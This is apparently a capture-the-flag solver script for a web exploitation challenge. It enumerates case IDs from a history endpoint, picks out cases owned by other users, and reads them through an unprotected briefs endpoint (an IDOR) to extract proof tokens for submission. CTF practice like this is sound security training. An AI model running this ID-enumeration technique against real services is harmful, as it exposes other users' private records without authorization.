#!/usr/bin/env python3
"""Huntress CTF 2026 - Web Exploitation Day 02 IDOR (Pocket SOC).
Dynamic solver: establish a session, read /api/history to find a case whose
owner != current_user (visibility reference_only / outside workspace), then
read that case via /api/briefs/<id> (the IDOR) and extract proof_<hex>.
Usage: web02_idor.py <challenge_id[/mode]> [--submit]
"""
import sys, re, json, requests
sys.path.insert(0, "~/ctf")
from gm import GM

PROOF_RE = re.compile(r"proof_[0-9a-fA-F]{16,}")

def recover_proof(base):
    base = base.rstrip("/")
    s = requests.Session(); s.headers["User-Agent"] = "ctf-recon"
    s.get(base + "/", timeout=25)
    cur, ids = None, []
    try:
        h = s.get(base + "/api/history", timeout=25).json()
        cur = h.get("current_user")
        for ev in h.get("events", []):
            ids.append(ev.get("case_id"))
        # prioritise foreign-owned cases
        foreign = [ev["case_id"] for ev in h.get("events", [])
                   if ev.get("owner") and ev.get("owner") != cur]
        ids = foreign + [i for i in ids if i not in foreign]
    except Exception:
        pass
    for cid in ids:
        if cid is None:
            continue
        try:
            r = s.get(base + "/api/briefs/%s" % cid, timeout=25)
            m = PROOF_RE.search(r.text)
            if m:
                return m.group(0)
        except Exception:
            continue
    return None

def _norm(tid):
    return tid.lower().replace(" ", "-")

def base_for(target_url, route_path):
    b = target_url.rstrip("/")
    if route_path:
        b += "/" + route_path.strip("/")
    return b

def main():
    import time
    ch = sys.argv[1]
    do_submit = "--submit" in sys.argv[2:]
    fresh = "--fresh" in sys.argv[2:]   # retry: spend one unique attempt for a fresh timer
    g = GM()
    t0 = time.time()
    r = g.retry(ch) if fresh else g.start(ch)
    targets = {t["id"]: t["url"] for t in r.get("targets", [])}
    routes = {rt["id"]: rt.get("path", "") for rt in r.get("routes", [])}
    questions = r.get("questions", [])
    print("mode=%s deadline=%s targets=%d questions=%d routes=%d" %
          (r.get("mode"), r.get("deadline"), len(targets), len(questions), len(routes)))
    answers = {}
    for q in questions:
        tid = q.get("artifact")
        url = targets.get(tid) or (list(targets.values())[0] if targets else None)
        route_path = routes.get(_norm(tid), "") if tid else ""
        if not route_path and len(routes) == 1:
            route_path = list(routes.values())[0]
        proof = recover_proof(base_for(url, route_path)) if url else None
        print("  %s (%s) -> %s" % (q["id"], tid, proof))
        if proof:
            answers[q["id"]] = proof
    print("recovered %d/%d  (elapsed %.1fs)" % (len(answers), len(questions), time.time() - t0))
    if do_submit and answers:
        res = g.submit(ch, answers)
        print("SUBMIT:", res.get("result"), "flag=" + str(res.get("flag")),
              "remaining=" + str(res.get("remaining")), "(elapsed %.1fs)" % (time.time() - t0))

if __name__ == "__main__":
    main()
